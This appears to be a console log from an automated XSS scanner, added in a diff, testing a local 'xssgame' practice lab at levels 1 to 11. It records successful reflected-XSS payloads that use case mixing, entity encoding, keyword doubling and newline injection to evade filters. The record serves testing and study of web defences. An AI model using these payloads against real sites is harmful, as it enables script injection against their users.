+[32m[2020-04-09 16:29:40,769] [log.py:90] [log:__console] [INFO]- 正在检测urlhttp://192.168.45.1/xss/xssgame/level10.php?name=2:[0m
+[32m[2020-04-09 16:29:40,785] [log.py:90] [log:__console] [INFO]- 正在检测urlhttp://192.168.45.1/xss/xssgame/level10.php?name=2&t_link=ysy&t_history=ysy&t_sort=ysy:[0m
+[32m[2020-04-09 16:29:40,791] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-09 16:29:40,853] [log.py:90] [log:__console] [INFO]- 检测出xss_payload:False:[0m
+[32m[2020-04-09 16:29:40,881] [log.py:90] [log:__console] [INFO]- 正在检测urlhttp://192.168.45.1/xss/xssgame/level11.php?name=2:[0m
+[32m[2020-04-09 16:29:40,975] [log.py:90] [log:__console] [INFO]- 正在检测urlhttp://192.168.45.1/xss/xssgame/level11.php?name=2:[0m
+[32m[2020-04-09 16:29:40,977] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-09 16:29:40,995] [log.py:90] [log:__console] [INFO]- 检测出xss_payload:http://192.168.45.1/xss/xssgame/level11.php?name=%0aalert(1);//:[0m
+[32m[2020-04-09 16:30:35,942] [log.py:90] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-09 16:30:35,959] [log.py:90] [log:__console] [INFO]- 正在检测urlhttp://192.168.45.1/xss/xssgame/level10.php?name=2:[0m
+[32m[2020-04-09 16:30:35,978] [log.py:90] [log:__console] [INFO]- 正在检测urlhttp://192.168.45.1/xss/xssgame/level10.php?name=2&t_link=ysy&t_history=ysy&t_sort=ysy:[0m
+[32m[2020-04-09 16:30:35,980] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-09 16:30:36,056] [log.py:90] [log:__console] [INFO]- 检测出xss_payload:False:[0m
+[32m[2020-04-09 16:30:36,081] [log.py:90] [log:__console] [INFO]- 正在检测urlhttp://192.168.45.1/xss/xssgame/level11.php?name=2:[0m
+[32m[2020-04-09 16:30:36,159] [log.py:90] [log:__console] [INFO]- 正在检测urlhttp://192.168.45.1/xss/xssgame/level11.php?name=2:[0m
+[32m[2020-04-09 16:30:36,161] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-09 16:30:36,201] [log.py:90] [log:__console] [INFO]- 检测出xss_payload:http://192.168.45.1/xss/xssgame/level11.php?name=%0aalert(1);//:[0m
+[32m[2020-04-09 17:02:23,248] [log.py:90] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-09 17:02:23,289] [log.py:90] [log:__console] [INFO]- 正在检测urlhttp://192.168.45.1/xss/xssgame/level10.php?name=2:[0m
+[32m[2020-04-09 17:02:23,317] [log.py:90] [log:__console] [INFO]- 正在检测urlhttp://192.168.45.1/xss/xssgame/level10.php?name=2&t_link=ysy&t_history=ysy&t_sort=ysy:[0m
+[32m[2020-04-09 17:02:23,323] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-09 17:02:23,391] [log.py:90] [log:__console] [INFO]- 检测xss第2个参数[0m
+[32m[2020-04-09 17:02:23,411] [log.py:90] [log:__console] [INFO]- 检测xss第3个参数[0m
+[32m[2020-04-09 17:02:23,445] [log.py:90] [log:__console] [INFO]- 检测xss第4个参数[0m
+[32m[2020-04-09 17:02:23,513] [log.py:90] [log:__console] [INFO]- 检测出xss_payload:http://192.168.45.1/xss/xssgame/level10.php?name=2&t_link=ysy&t_history=ysy&t_sort=yy78pq%22ONclick%3D%22alert%281%29:[0m
+[32m[2020-04-09 17:02:23,581] [log.py:90] [log:__console] [INFO]- 正在检测urlhttp://192.168.45.1/xss/xssgame/level11.php?name=2:[0m
+[32m[2020-04-09 17:02:23,617] [log.py:90] [log:__console] [INFO]- 正在检测urlhttp://192.168.45.1/xss/xssgame/level11.php?name=2:[0m
+[32m[2020-04-09 17:02:23,618] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-09 17:02:23,707] [log.py:90] [log:__console] [INFO]- 检测出xss_payload:http://192.168.45.1/xss/xssgame/level11.php?name=%0aalert(1);//:[0m
+[32m[2020-04-09 17:03:42,415] [log.py:90] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-09 17:03:42,444] [log.py:90] [log:__console] [INFO]- 正在检测url:http://192.168.45.1/xss/xssgame/level10.php?name=2[0m
+[32m[2020-04-09 17:03:42,476] [log.py:90] [log:__console] [INFO]- 正在检测url:http://192.168.45.1/xss/xssgame/level10.php?name=2&t_link=ysy&t_history=ysy&t_sort=ysy[0m
+[32m[2020-04-09 17:03:42,484] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-09 17:03:42,532] [log.py:90] [log:__console] [INFO]- 检测xss第2个参数[0m
+[32m[2020-04-09 17:03:42,554] [log.py:90] [log:__console] [INFO]- 检测xss第3个参数[0m
+[32m[2020-04-09 17:03:42,568] [log.py:90] [log:__console] [INFO]- 检测xss第4个参数[0m
+[32m[2020-04-09 17:03:42,666] [log.py:90] [log:__console] [INFO]- 检测出xss_payload:http://192.168.45.1/xss/xssgame/level10.php?name=2&t_link=ysy&t_history=ysy&t_sort=yy78pq%22onclIcK%3D%22alert%281%29:[0m
+[32m[2020-04-09 17:03:42,721] [log.py:90] [log:__console] [INFO]- 正在检测url:http://192.168.45.1/xss/xssgame/level11.php?name=2[0m
+[32m[2020-04-09 17:03:42,766] [log.py:90] [log:__console] [INFO]- 正在检测url:http://192.168.45.1/xss/xssgame/level11.php?name=2[0m
+[32m[2020-04-09 17:03:42,768] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-09 17:03:42,824] [log.py:90] [log:__console] [INFO]- 检测出xss_payload:http://192.168.45.1/xss/xssgame/level11.php?name=%0aalert(1);//:[0m
+[32m[2020-04-09 17:03:55,208] [log.py:90] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-09 17:03:55,229] [log.py:90] [log:__console] [INFO]- 正在检测url:http://192.168.45.1/xss/xssgame/level10.php?name=2[0m
+[32m[2020-04-09 17:03:55,265] [log.py:90] [log:__console] [INFO]- 正在检测url:http://192.168.45.1/xss/xssgame/level10.php?name=2&t_link=ysy&t_history=ysy&t_sort=ysy[0m
+[32m[2020-04-09 17:03:55,278] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-09 17:03:55,322] [log.py:90] [log:__console] [INFO]- 检测xss第2个参数[0m
+[32m[2020-04-09 17:03:55,334] [log.py:90] [log:__console] [INFO]- 检测xss第3个参数[0m
+[32m[2020-04-09 17:03:55,358] [log.py:90] [log:__console] [INFO]- 检测xss第4个参数[0m
+[32m[2020-04-09 17:03:55,442] [log.py:90] [log:__console] [INFO]- 检测出xss_payload:http://192.168.45.1/xss/xssgame/level10.php?name=2&t_link=ysy&t_history=ysy&t_sort=yy78pq%22oNclIck%3D%22alert%281%29[0m
+[32m[2020-04-09 17:03:55,526] [log.py:90] [log:__console] [INFO]- 正在检测url:http://192.168.45.1/xss/xssgame/level11.php?name=2[0m
+[32m[2020-04-09 17:03:55,546] [log.py:90] [log:__console] [INFO]- 正在检测url:http://192.168.45.1/xss/xssgame/level11.php?name=2[0m
+[32m[2020-04-09 17:03:55,556] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-09 17:03:55,603] [log.py:90] [log:__console] [INFO]- 检测出xss_payload:http://192.168.45.1/xss/xssgame/level11.php?name=%0aalert(1);//[0m
+[32m[2020-04-09 17:11:48,803] [log.py:90] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-09 17:11:48,832] [log.py:90] [log:__console] [INFO]- 正在检测url:http://192.168.45.1/xss/xssgame/level10.php?name=2[0m
+[32m[2020-04-09 17:11:48,970] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-09 17:11:48,999] [log.py:90] [log:__console] [INFO]- 检测出xss_payload:False[0m
+[32m[2020-04-09 17:11:49,055] [log.py:90] [log:__console] [INFO]- 正在检测url:http://192.168.45.1/xss/xssgame/level11.php?name=2[0m
+[32m[2020-04-09 17:11:49,101] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-09 17:11:49,157] [log.py:90] [log:__console] [INFO]- 检测出xss_payload:http://192.168.45.1/xss/xssgame/level11.php?name=%0aalert(1);//[0m
+[32m[2020-04-09 17:12:41,478] [log.py:90] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-09 17:12:41,540] [log.py:90] [log:__console] [INFO]- 正在检测url:http://192.168.45.1/xss/xssgame/level10.php?name=2[0m
+[32m[2020-04-09 17:12:41,696] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-09 17:12:41,740] [log.py:90] [log:__console] [INFO]- 检测出xss_payload:False[0m
+[32m[2020-04-09 17:12:41,795] [log.py:90] [log:__console] [INFO]- 正在检测url:http://192.168.45.1/xss/xssgame/level11.php?name=2[0m
+[32m[2020-04-09 17:12:41,851] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-09 17:12:41,911] [log.py:90] [log:__console] [INFO]- 检测出xss_payload:http://192.168.45.1/xss/xssgame/level11.php?name=%0aalert(1);//[0m
+[32m[2020-04-09 17:14:13,032] [log.py:90] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-09 17:14:13,121] [log.py:90] [log:__console] [INFO]- 正在检测url:http://192.168.45.1/xss/xssgame/level10.php?name=2[0m
+[32m[2020-04-09 17:14:13,309] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-09 17:14:13,351] [log.py:90] [log:__console] [INFO]- 检测出xss_payload:False[0m
+[32m[2020-04-09 17:14:13,427] [log.py:90] [log:__console] [INFO]- 正在检测url:http://192.168.45.1/xss/xssgame/level11.php?name=2[0m
+[32m[2020-04-09 17:14:13,500] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-09 17:14:13,574] [log.py:90] [log:__console] [INFO]- 检测出xss_payload:http://192.168.45.1/xss/xssgame/level11.php?name=%0aalert(1);//[0m
+[32m[2020-04-09 17:16:59,163] [log.py:90] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-09 17:16:59,238] [log.py:90] [log:__console] [INFO]- 正在检测url:http://192.168.45.1/xss/xssgame/level10.php?name=2[0m
+[32m[2020-04-09 17:16:59,404] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-09 17:16:59,442] [log.py:90] [log:__console] [INFO]- 检测出xss_payload:False[0m
+[32m[2020-04-09 17:16:59,516] [log.py:90] [log:__console] [INFO]- 正在检测url:http://192.168.45.1/xss/xssgame/level11.php?name=2[0m
+[32m[2020-04-09 17:16:59,579] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-09 17:16:59,649] [log.py:90] [log:__console] [INFO]- 检测出xss_payload:http://192.168.45.1/xss/xssgame/level11.php?name=%0aalert(1);//[0m
+[32m[2020-04-09 17:23:21,482] [log.py:90] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-09 17:23:21,565] [log.py:90] [log:__console] [INFO]- 正在检测url:http://192.168.45.1/xss/xssgame/level10.php?name=2[0m
+[32m[2020-04-09 17:23:21,704] [log.py:90] [log:__console] [INFO]- 检测出xss_payload:http://192.168.45.1/xss/xssgame/level10.php?name=2&t_sort=ysy"><img sRc=1 onERRor="alert(1)[0m
+[32m[2020-04-09 17:23:21,769] [log.py:90] [log:__console] [INFO]- 正在检测url:http://192.168.45.1/xss/xssgame/level11.php?name=2[0m
+[32m[2020-04-09 17:23:21,824] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-09 17:23:21,907] [log.py:90] [log:__console] [INFO]- 检测出xss_payload:http://192.168.45.1/xss/xssgame/level11.php?name=%0aalert(1);//[0m
+[32m[2020-04-09 17:27:40,245] [log.py:90] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-09 17:27:40,324] [log.py:90] [log:__console] [INFO]- 正在检测url:http://192.168.45.1/xss/xssgame/level10.php?name=2[0m
+[32m[2020-04-09 17:27:40,478] [log.py:90] [log:__console] [INFO]- 检测出xss_payload:http%3A//192.168.45.1/xss/xssgame/level10.php%3Fname%3D2%26t_sort%3Dysy%22%3E%3Cimg%20sRc%3D1%20onERRor%3D%22alert%281%29[0m
+[32m[2020-04-09 17:27:40,554] [log.py:90] [log:__console] [INFO]- 正在检测url:http://192.168.45.1/xss/xssgame/level11.php?name=2[0m
+[32m[2020-04-09 17:27:40,613] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-09 17:27:40,682] [log.py:90] [log:__console] [INFO]- 检测出xss_payload:http://192.168.45.1/xss/xssgame/level11.php?name=%0aalert(1);//[0m
+[32m[2020-04-09 17:30:15,996] [log.py:90] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-09 17:30:16,069] [log.py:90] [log:__console] [INFO]- 正在检测url:http://192.168.45.1/xss/xssgame/level10.php?name=2[0m
+[32m[2020-04-09 17:30:16,193] [log.py:90] [log:__console] [INFO]- 检测出xss_payload:http://192.168.45.1/xss/xssgame/level10.php?name=2&t_sort=%22%3E%3Cimg%20sRc%3D1%20onERRor%3D%22alert%281%29[0m
+[32m[2020-04-09 17:30:16,255] [log.py:90] [log:__console] [INFO]- 正在检测url:http://192.168.45.1/xss/xssgame/level11.php?name=2[0m
+[32m[2020-04-09 17:30:16,314] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-09 17:30:16,389] [log.py:90] [log:__console] [INFO]- 检测出xss_payload:http://192.168.45.1/xss/xssgame/level11.php?name=%0aalert(1);//[0m
+[32m[2020-04-24 15:58:28,444] [log.py:90] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-24 15:58:43,148] [log.py:90] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-24 15:58:52,239] [log.py:90] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-24 16:00:29,898] [log.py:90] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-24 16:00:33,311] [log.py:90] [log:__console] [INFO]- 正在检测url:http://192.168.45.1/xss/xssgame/level1.php?name=1&x=2[0m
+[32m[2020-04-24 16:00:33,329] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-24 16:00:33,369] [log.py:90] [log:__console] [INFO]- 检测出xss_payload:http://192.168.45.1/xss/xssgame/level1.php?name=%3Csvg%20OnloAd%3Dalert%281%29%3E&x=2[0m
+[32m[2020-04-24 16:00:33,426] [log.py:90] [log:__console] [INFO]- 正在检测url:http://192.168.45.1/xss/xssgame/level2.php?keyword=2[0m
+[32m[2020-04-24 16:00:33,447] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-24 16:00:33,475] [log.py:90] [log:__console] [INFO]- 检测出xss_payload:http://192.168.45.1/xss/xssgame/level2.php?keyword=yy78pq%22OncliCk%3D%22alert%281%29[0m
+[32m[2020-04-24 16:00:33,511] [log.py:90] [log:__console] [INFO]- 正在检测url:http://192.168.45.1/xss/xssgame/level3.php?keyword=2[0m
+[32m[2020-04-24 16:00:33,550] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-24 16:00:33,615] [log.py:90] [log:__console] [INFO]- 检测出xss_payload:http://192.168.45.1/xss/xssgame/level3.php?keyword=yy78pq%27oncliCK%3D%27alert%281%29[0m
+[32m[2020-04-24 16:00:33,668] [log.py:90] [log:__console] [INFO]- 正在检测url:http://192.168.45.1/xss/xssgame/level4.php?keyword=2[0m
+[32m[2020-04-24 16:00:33,683] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-24 16:00:33,732] [log.py:90] [log:__console] [INFO]- 检测出xss_payload:http://192.168.45.1/xss/xssgame/level4.php?keyword=yy78pq%22OnClick%3D%22alert%281%29[0m
+[32m[2020-04-24 16:00:33,762] [log.py:90] [log:__console] [INFO]- 正在检测url:http://192.168.45.1/xss/xssgame/level5.php?keyword=2[0m
+[32m[2020-04-24 16:00:33,794] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-24 16:00:33,859] [log.py:90] [log:__console] [INFO]- 检测出xss_payload:http://192.168.45.1/xss/xssgame/level5.php?keyword=yy78pq%22%3E%3Ciframe%20src%3D%22javascr%26%23x69%3B%26%23x70%3B%26%23x74%3B%3Aa%26%23x6c%3B%26%23x65%3B%26%23x72%3Bt%26%23x28%3B%26%23x31%3B%29[0m
+[32m[2020-04-24 16:00:33,876] [log.py:90] [log:__console] [INFO]- 正在检测url:http://192.168.45.1/xss/xssgame/level6.php?keyword=2[0m
+[32m[2020-04-24 16:00:33,904] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-24 16:00:33,961] [log.py:90] [log:__console] [INFO]- 检测出xss_payload:http://192.168.45.1/xss/xssgame/level6.php?keyword=yy78pq%22OnclicK%3D%22alert%281%29[0m
+[32m[2020-04-24 16:00:33,982] [log.py:90] [log:__console] [INFO]- 正在检测url:http://192.168.45.1/xss/xssgame/level7.php?keyword=2[0m
+[32m[2020-04-24 16:00:34,025] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-24 16:00:34,092] [log.py:90] [log:__console] [INFO]- 检测出xss_payload:http://192.168.45.1/xss/xssgame/level7.php?keyword=yy78pq%22oonclicknclick%3D%22alert%281%29[0m
+[32m[2020-04-24 16:00:34,179] [log.py:90] [log:__console] [INFO]- 正在检测url:http://192.168.45.1/xss/xssgame/level8.php?keyword=2&submit=%E6%B7%BB%E5%8A%A0%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5[0m
+[32m[2020-04-24 16:00:34,190] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-24 16:00:34,222] [log.py:90] [log:__console] [INFO]- 检测出xss_payload:http://192.168.45.1/xss/xssgame/level8.php?keyword=ja%26%23x76%3Basc%26%23x72%3B%26%23x69%3B%26%23x70%3B%26%23x74%3B%26%23x3a%3B%26%23x61%3B%26%23x6c%3B%26%23x65%3Br%26%23x74%3B%26%23x28%3B1%26%23x29%3B&submit=%E6%B7%BB%E5%8A%A0%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5[0m
+[32m[2020-04-24 16:00:34,309] [log.py:90] [log:__console] [INFO]- 正在检测url:http://192.168.45.1/xss/xssgame/level9.php?name=2[0m
+[32m[2020-04-24 16:00:34,335] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-24 16:00:34,350] [log.py:90] [log:__console] [INFO]- 检测出xss_payload:http://192.168.45.1/xss/xssgame/level9.php?name=yy78pq%22%3Balert%281%29//[0m
+[32m[2020-04-24 16:00:34,380] [log.py:90] [log:__console] [INFO]- 正在检测url:http://192.168.45.1/xss/xssgame/level9a.php?name=2[0m
+[32m[2020-04-24 16:00:34,405] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-24 16:00:34,428] [log.py:90] [log:__console] [INFO]- 检测出xss_payload:http://192.168.45.1/xss/xssgame/level9a.php?name=yy78pq%27%3Balert%281%29//[0m
+[32m[2020-04-24 16:00:34,476] [log.py:90] [log:__console] [INFO]- 正在检测url:http://192.168.45.1/xss/xssgame/level10.php?name=2[0m
+[32m[2020-04-24 16:00:34,503] [log.py:90] [log:__console] [INFO]- 检测出xss_payload:http://192.168.45.1/xss/xssgame/level10.php?name=2&t_sort=%22%3E%3Cimg%20sRc%3D1%20onERRor%3D%22alert%281%29[0m
+[32m[2020-04-24 16:00:34,515] [log.py:90] [log:__console] [INFO]- 正在检测url:http://192.168.45.1/xss/xssgame/level11.php?name=2[0m
+[32m[2020-04-24 16:00:34,546] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-24 16:00:34,579] [log.py:90] [log:__console] [INFO]- 检测出xss_payload:http://192.168.45.1/xss/xssgame/level11.php?name=%0aalert(1);//[0m
+[32m[2020-04-24 16:01:13,378] [log.py:90] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-24 16:01:13,395] [log.py:90] [log:__console] [INFO]- 正在检测url:http://192.168.45.1/xss/xssgame/level1.php?name=1&x=2[0m
+[32m[2020-04-24 16:01:13,426] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-24 16:01:13,481] [log.py:90] [log:__console] [INFO]- 正在检测url:http://192.168.45.1/xss/xssgame/level2.php?keyword=2[0m
+[32m[2020-04-24 16:01:13,510] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-24 16:01:13,563] [log.py:90] [log:__console] [INFO]- 正在检测url:http://192.168.45.1/xss/xssgame/level3.php?keyword=2[0m
+[32m[2020-04-24 16:01:13,574] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-24 16:01:13,653] [log.py:90] [log:__console] [INFO]- 正在检测url:http://192.168.45.1/xss/xssgame/level4.php?keyword=2[0m
+[32m[2020-04-24 16:01:13,664] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-24 16:01:13,745] [log.py:90] [log:__console] [INFO]- 正在检测url:http://192.168.45.1/xss/xssgame/level5.php?keyword=2[0m
+[32m[2020-04-24 16:01:13,754] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-24 16:01:13,792] [log.py:90] [log:__console] [INFO]- 正在检测url:http://192.168.45.1/xss/xssgame/level6.php?keyword=2[0m
+[32m[2020-04-24 16:01:13,827] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-24 16:01:13,900] [log.py:90] [log:__console] [INFO]- 正在检测url:http://192.168.45.1/xss/xssgame/level7.php?keyword=2[0m
+[32m[2020-04-24 16:01:13,936] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-24 16:01:13,994] [log.py:90] [log:__console] [INFO]- 正在检测url:http://192.168.45.1/xss/xssgame/level8.php?keyword=2&submit=%E6%B7%BB%E5%8A%A0%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5[0m
+[32m[2020-04-24 16:01:14,025] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-24 16:01:14,065] [log.py:90] [log:__console] [INFO]- 正在检测url:http://192.168.45.1/xss/xssgame/level9.php?name=2[0m
+[32m[2020-04-24 16:01:14,143] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-24 16:01:14,229] [log.py:90] [log:__console] [INFO]- 正在检测url:http://192.168.45.1/xss/xssgame/level9a.php?name=2[0m
+[32m[2020-04-24 16:01:14,269] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-24 16:01:14,322] [log.py:90] [log:__console] [INFO]- 正在检测url:http://192.168.45.1/xss/xssgame/level10.php?name=2[0m
+[32m[2020-04-24 16:01:14,370] [log.py:90] [log:__console] [INFO]- 正在检测url:http://192.168.45.1/xss/xssgame/level11.php?name=2[0m
+[32m[2020-04-24 16:01:14,382] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-24 16:01:46,875] [log.py:90] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-24 16:01:46,895] [log.py:90] [log:__console] [INFO]- 正在检测url:http://192.168.45.1/xss/xssgame/level1.php?name=1&x=2[0m
+[32m[2020-04-24 16:01:46,927] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-24 16:01:46,958] [log.py:90] [log:__console] [INFO]- 正在检测url:http://192.168.45.1/xss/xssgame/level2.php?keyword=2[0m
+[32m[2020-04-24 16:01:46,982] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-24 16:01:47,065] [log.py:90] [log:__console] [INFO]- 正在检测url:http://192.168.45.1/xss/xssgame/level3.php?keyword=2[0m
+[32m[2020-04-24 16:01:47,108] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-24 16:01:47,164] [log.py:90] [log:__console] [INFO]- 正在检测url:http://192.168.45.1/xss/xssgame/level4.php?keyword=2[0m
+[32m[2020-04-24 16:01:47,196] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-24 16:01:47,243] [log.py:90] [log:__console] [INFO]- 正在检测url:http://192.168.45.1/xss/xssgame/level5.php?keyword=2[0m
+[32m[2020-04-24 16:01:47,277] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-24 16:01:47,345] [log.py:90] [log:__console] [INFO]- 正在检测url:http://192.168.45.1/xss/xssgame/level6.php?keyword=2[0m
+[32m[2020-04-24 16:01:47,382] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-24 16:01:47,464] [log.py:90] [log:__console] [INFO]- 正在检测url:http://192.168.45.1/xss/xssgame/level7.php?keyword=2[0m
+[32m[2020-04-24 16:01:47,498] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-24 16:01:47,624] [log.py:90] [log:__console] [INFO]- 正在检测url:http://192.168.45.1/xss/xssgame/level8.php?keyword=2&submit=%E6%B7%BB%E5%8A%A0%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5[0m
+[32m[2020-04-24 16:01:47,670] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-24 16:01:47,795] [log.py:90] [log:__console] [INFO]- 正在检测url:http://192.168.45.1/xss/xssgame/level9.php?name=2[0m
+[32m[2020-04-24 16:01:47,839] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-24 16:01:47,934] [log.py:90] [log:__console] [INFO]- 正在检测url:http://192.168.45.1/xss/xssgame/level9a.php?name=2[0m
+[32m[2020-04-24 16:01:47,965] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-24 16:01:48,034] [log.py:90] [log:__console] [INFO]- 正在检测url:http://192.168.45.1/xss/xssgame/level10.php?name=2[0m
+[32m[2020-04-24 16:01:48,111] [log.py:90] [log:__console] [INFO]- 正在检测url:http://192.168.45.1/xss/xssgame/level11.php?name=2[0m
+[32m[2020-04-24 16:01:48,143] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-24 16:02:35,089] [log.py:90] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-24 16:02:35,107] [log.py:90] [log:__console] [INFO]- 正在检测url:http://192.168.45.1/xss/xssgame/level1.php?name=1&x=2[0m
+[32m[2020-04-24 16:02:35,152] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[36m[2020-04-24 16:02:35,163] [log.py:92] [log:__console] [DEBUG]- 检测出xss_payload:[0m
+[32m[2020-04-24 16:03:04,651] [log.py:90] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-24 16:03:04,674] [log.py:90] [log:__console] [INFO]- 正在检测url:http://192.168.45.1/xss/xssgame/level1.php?name=1&x=2[0m
+[32m[2020-04-24 16:03:04,720] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[36m[2020-04-24 16:03:04,746] [log.py:92] [log:__console] [DEBUG]- 检测出xss_payload:[0m
+[36m[2020-04-24 16:03:04,763] [log.py:92] [log:__console] [DEBUG]- http://192.168.45.1/xss/xssgame/level1.php?name=%3Csvg%20onlOaD%3Dalert%281%29%3E&x=2[0m
+[32m[2020-04-24 16:03:49,137] [log.py:90] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-24 16:03:49,165] [log.py:90] [log:__console] [INFO]- 正在检测url:http://192.168.45.1/xss/xssgame/level1.php?name=1&x=2[0m
+[32m[2020-04-24 16:03:49,198] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[36m[2020-04-24 16:03:49,232] [log.py:92] [log:__console] [DEBUG]- 检测出xss_payload:[0m
+[36m[2020-04-24 16:03:49,255] [log.py:92] [log:__console] [DEBUG]- http://192.168.45.1/xss/xssgame/level1.php?name=%3Csvg%20onLOad%3Dalert%281%29%3E&x=2[0m
+[32m[2020-04-24 16:03:49,269] [log.py:90] [log:__console] [INFO]- 正在检测url:http://192.168.45.1/xss/xssgame/level2.php?keyword=2[0m
+[32m[2020-04-24 16:03:49,280] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[36m[2020-04-24 16:03:49,323] [log.py:92] [log:__console] [DEBUG]- 检测出xss_payload:[0m
+[36m[2020-04-24 16:03:49,351] [log.py:92] [log:__console] [DEBUG]- http://192.168.45.1/xss/xssgame/level2.php?keyword=yy78pq%22onclIcK%3D%22alert%281%29[0m
+[32m[2020-04-24 16:03:49,361] [log.py:90] [log:__console] [INFO]- 正在检测url:http://192.168.45.1/xss/xssgame/level3.php?keyword=2[0m
+[32m[2020-04-24 16:03:49,395] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[36m[2020-04-24 16:03:49,442] [log.py:92] [log:__console] [DEBUG]- 检测出xss_payload:[0m
+[36m[2020-04-24 16:03:49,447] [log.py:92] [log:__console] [DEBUG]- http://192.168.45.1/xss/xssgame/level3.php?keyword=yy78pq%27onClicK%3D%27alert%281%29[0m
